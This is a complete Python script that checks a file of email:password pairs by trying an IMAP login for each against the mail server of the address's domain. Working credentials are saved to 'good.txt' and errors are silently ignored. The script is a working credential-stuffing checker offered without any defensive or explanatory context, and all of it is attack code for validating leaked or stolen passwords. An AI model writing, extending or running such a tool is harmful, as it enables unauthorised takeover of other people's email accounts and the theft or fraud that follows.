#!/usr/bin/python
# -*- coding: UTF-8 -*-

import imaplib


def get_mail_list(path):
	mail = []
	with open(path,'r') as f:
		for line in f:
			mail.append(line.strip())
	return mail

def mail_auth(login,password):
	try:
		server = login.split('@')[1]
		mail = imaplib.IMAP4_SSL('imap.'+server)
		mail.login(login,password)
		print('%s:%s' % (login,password))
		with open('good.txt','a') as f:
			f.write('%s:%s\n' % (login,password))
		return True
	except:
		return False

def main():
	mail = get_mail_list('mail.txt')
	for account in mail:
		login = account.split(':')[0]
		password = account.split(':')[1]
		mail_auth(login,password)


if __name__ == '__main__':
	main()